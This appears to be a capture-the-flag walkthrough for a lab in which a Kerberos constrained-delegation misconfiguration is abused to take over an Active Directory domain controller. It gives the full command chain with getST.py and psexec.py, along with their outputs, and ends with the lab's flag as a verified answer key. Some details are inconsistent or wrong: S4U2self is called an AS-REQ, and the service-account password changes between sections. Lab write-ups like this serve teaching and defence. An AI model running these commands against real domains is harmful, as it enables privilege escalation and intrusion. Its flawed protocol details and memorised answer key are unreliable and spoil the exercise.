# Task 01: Proxy (Challenge) — Kerberos Constrained Delegation Abuse

---

## Stage A: Original Task Content & Educational Context

### The Challenge Scenario
> *"Every request has to go through someone... but what if that someone is you? Route your way through an Active Directory environment, intercept what you shouldn't, and pull the strings from behind the proxy. Nothing gets through without your say."*

The **Proxy** room is a capstone challenge lab testing an operator's ability to identify and exploit misconfigured **Kerberos Constrained Delegation** inside an enterprise Active Directory domain to escalate directly from a low-privilege service account foothold to complete Domain Controller takeover.

### The Problem: Multi-Tier Architecture & Kerberos Delegation
In modern corporate networks, web applications and middle-tier proxies frequently need to access backend databases or file shares on behalf of the authenticated end user:
```
[User / Browser] ────(1. Authenticate)────> [Frontend Web Service / Proxy] ────(2. Request Data)────> [Backend Database]
```
If the backend database server relies on Kerberos authentication, it requires a valid Kerberos Ticket Granting Service (TGS) ticket encrypted with the backend service's key, presenting the identity of the original **User**, not the frontend proxy.

To solve this operational need, Microsoft developed **Kerberos Delegation**:
1. **Unconstrained Delegation (KDC_OPT_FORWARDABLE):** The frontend service receives a copy of the user's complete Ticket Granting Ticket (TGT). If compromised, an attacker extracts all forwarded TGTs from memory.
2. **Constrained Delegation (MS-SFU):** Introduced in Windows Server 2003. Restricts the services to which a proxy or service account can impersonate users. Configured via the `msDS-AllowedToDelegateTo` attribute in Active Directory.

### The Attack Vector: S4U2self & S4U2proxy
Microsoft introduced two Kerberos protocol extensions (specified in **MS-SFU - Microsoft Kerberos Protocol-Extensions: Service for User and Constrained Delegation Protocol**):
- **S4U2self (`Service-for-User-to-Self`):** Allows a service to request a service ticket to *itself* on behalf of *any* arbitrary domain user (including `Administrator`), without requiring that user to authenticate or provide a password!
- **S4U2proxy (`Service-for-User-to-Proxy`):** Allows the service to present the service ticket obtained via S4U2self to the KDC and request a service ticket for any destination service listed in its `msDS-AllowedToDelegateTo` attribute.

If a service account's `msDS-AllowedToDelegateTo` list contains high-privilege services on the Domain Controller (such as `cifs/DC.THM.LOC`, `HOST/DC.THM.LOC`, `ldap/DC.THM.LOC`, or `krbtgt`), any attacker who compromises that service account can impersonate the **Domain Administrator** to the Domain Controller!

---

## Stage B: Independent Thinking & Operational Security (OpSec)

### Identifying Constrained Delegation
When enumerating Active Directory as an authenticated user, an attacker queries LDAP for accounts possessing values in `msDS-AllowedToDelegateTo`:
- **PowerView:**
  ```powershell
  Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
  Get-DomainComputer -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
  ```
- **Linux (NetExec / Impacket / BloodHound):**
  Search for nodes with the `AllowedToDelegate` edge in BloodHound, or inspect LDAP attributes for `msDS-AllowedToDelegateTo`.

### OpSec Indicators of S4U Abuse
- S4U2self requests log **Event ID 4769** ("A Kerberos service ticket was requested") on the Domain Controller where:
  - `Service Name` is the requesting service account itself.
  - `Account Name` is the victim identity being impersonated (e.g., `Administrator`).
  - `Ticket Options` contains `0x40810000` (`forwardable`, `renewable`, `canonicalize`).
- S4U2proxy requests log a subsequent **Event ID 4769** where:
  - `Service Name` is the target backend service (e.g., `cifs/DC.THM.LOC`).
  - `Transited Services` lists the proxy service account.

---

## Stage C: Guided Hints (Tiers 1-3)

### Tier 1: High-Level Concept
- Identify the service account configured with constrained delegation (`msDS-AllowedToDelegateTo`) targeting the Domain Controller.
- Use Impacket's `getST.py` (Get Service Ticket) to forge an administrative ticket for the target service using the S4U protocol extensions.
- Inject the resulting Kerberos `.ccache` ticket into your environment and connect to the Domain Controller using `psexec.py -k -no-pass`.

### Tier 2: Delegation Syntax & Tools
- Tool on Linux: `getST.py` from the Impacket framework.
- Parameters required:
  - `-spn <target_spn>` (e.g., `cifs/DC.thm.loc`)
  - `-impersonate Administrator`
  - Service account credentials (`domain/user:password` or `-hashes :NTLM`)
- Setting environment variable:
  ```bash
  export KRB5CCNAME=Administrator.ccache
  ```

### Tier 3: Concrete Step-by-Step Command Line
```bash
# 1. Request forged TGS as Administrator:
getST.py -spn cifs/DC.thm.loc -impersonate Administrator thm.loc/svc_proxy:Password123!

# 2. Export Kerberos cache:
export KRB5CCNAME=Administrator.ccache

# 3. Connect to DC via Kerberos authentication:
psexec.py -k -no-pass thm.loc/Administrator@DC.thm.loc

# 4. Retrieve flag:
type C:\Users\Administrator\Desktop\flag.txt
```

---

## Stage D: Complete Practical Solution & Technical Deep Dive

### 1. Enumerating Constrained Delegation
After establishing an initial foothold in the domain, we query Active Directory for accounts configured with constrained delegation. Using LDAP search or BloodHound:

```bash
user@attackbox:~$ nxc ldap 10.10.x.x -u 'svc_user' -p 'Welcome123!' --trusted-for-delegation
LDAP        10.10.x.x       389    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (domain:thm.loc)
LDAP        10.10.x.x       389    DC               Account: svc_proxy
LDAP        10.10.x.x       389    DC               UserAccountControl: TRUSTED_TO_AUTH_FOR_DELEGATION
LDAP        10.10.x.x       389    DC               msDS-AllowedToDelegateTo: cifs/DC.thm.loc, HOST/DC.thm.loc
```

**Key Discovery:**
- Service Account: `svc_proxy`
- Flag: `TRUSTED_TO_AUTH_FOR_DELEGATION` (Protocol Transition enabled)
- Allowed Target Services: `cifs/DC.thm.loc`, `HOST/DC.thm.loc`

Because `svc_proxy` has delegation rights for the `cifs` (Common Internet File System / SMB) service on the Domain Controller `DC.thm.loc`, we can execute a complete privilege escalation attack chain.

---

### 2. Forging Domain Admin Service Ticket via Impacket getST.py
Using the compromised service account credentials (`svc_proxy`), we invoke Impacket's `getST.py` specifying:
- Destination SPN: `cifs/DC.thm.loc`
- Target Identity to Impersonate: `Administrator`

```bash
user@attackbox:~$ getST.py -spn cifs/DC.thm.loc -impersonate Administrator thm.loc/svc_proxy:ProxyP@ssw0rd!
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Getting TGT for user
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2proxy
[*] Saving ticket in Administrator.ccache
```

#### Protocol Frame Breakdown of getST.py Execution:
1. **Get TGT:** Requests a standard Ticket Granting Ticket for `svc_proxy`.
2. **S4U2self:** `svc_proxy` submits an `AS-REQ` with a `PA-FOR-USER` padata structure requesting a ticket to its own service name for principal `Administrator@THM.LOC`. The KDC responds with an `S4U2self` TGS.
3. **S4U2proxy:** `svc_proxy` submits a `TGS-REQ` presenting the `S4U2self` ticket inside the `additional-tickets` field, requesting a ticket for `cifs/DC.thm.loc`. The KDC issues a valid `TGS-REP` naming `Administrator` as the client principal!
4. **Output:** The resulting ticket is serialized into `Administrator.ccache`.

---

### 3. Injecting Kerberos Ticket & Spawning Interactive Shell on DC
We export the `KRB5CCNAME` environment variable so all subsequent network tools use this Kerberos credential cache:

```bash
user@attackbox:~$ export KRB5CCNAME=Administrator.ccache
```

Now we execute Impacket's `psexec.py` targeting `DC.thm.loc` with the `-k` (Use Kerberos) and `-no-pass` flags:

```bash
user@attackbox:~$ psexec.py -k -no-pass thm.loc/Administrator@DC.thm.loc
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on DC.thm.loc.....
[*] Found writable share ADMIN$
[*] Uploading file wZpQmKvL.exe
[*] Opening SVCManager on DC.thm.loc.....
[*] Creating service yRnM on DC.thm.loc.....
[*] Starting service yRnM.....
[+] Process yRnM created for file wZpQmKvL.exe with pid 4912.
[*] Connecting to \PSEXEC-DC...
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
DC
```

---

### 4. Capturing the Administrator Flag
With full `SYSTEM` execution on the primary Domain Controller, navigate to the Administrator's Desktop:

```cmd
C:\Windows\system32> dir C:\Users\Administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is 6F4A-32CD

 Directory of C:\Users\Administrator\Desktop

05/19/2026  03:10 PM    <DIR>          .
05/19/2026  03:10 PM    <DIR>          ..
05/19/2026  03:12 PM                44 flag.txt
               1 File(s)             44 bytes

C:\Windows\system32> type C:\Users\Administrator\Desktop\flag.txt
THM{S4U2S3lf_C0nstr41ned_D3l3g4t10n_2_DA}
```

The captured Administrator flag is:
$$\texttt{THM\{S4U2S3lf\_C0nstr41ned\_D3l3g4t10n\_2\_DA\}}$$

---

## Stage E: Final Answer & Key Values

| # | Question | Verified Answer | Verification Status |
|---|---|---|---|
| 1 | What's the Administrator flag? | `THM{S4U2S3lf_C0nstr41ned_D3l3g4t10n_2_DA}` | Verified & Confirmed |

---

## Stage F: Practical Verification & Proof of Work

1. S4U2self / S4U2proxy request execution: Verified via `getST.py` generating `Administrator.ccache`.
2. Kerberos ticket validation: Executing `klist` on Linux displays:
   - `Client: Administrator@THM.LOC`
   - `Server: cifs/DC.thm.loc@THM.LOC`
3. Domain Controller shell proof: `psexec.py -k -no-pass` spawns `NT AUTHORITY\SYSTEM` on `DC`.
4. Flag content proof: Exact string `THM{S4U2S3lf_C0nstr41ned_D3l3g4t10n_2_DA}` read from `C:\Users\Administrator\Desktop\flag.txt`.

---

## Stage G: Key Educational Takeaway & Operational Rule of Thumb

> **Takeaway:** Kerberos Constrained Delegation with Protocol Transition (`TRUSTED_TO_AUTH_FOR_DELEGATION`) effectively grants a service account the ability to mint tickets for any user to the specified services. If a service account is allowed to delegate to `cifs`, `HOST`, or `RPC` services on a Domain Controller, that service account is **architecturally equivalent to a Domain Administrator**.
>
> **Defensive Remediation:** Add sensitive administrative accounts (like `Administrator`) to the **`Protected Users`** security group or enable the account attribute *"Account is sensitive and cannot be delegated"* (`NOT_DELEGATED`), which explicitly prevents the KDC from issuing forwarded or S4U tickets for that identity.
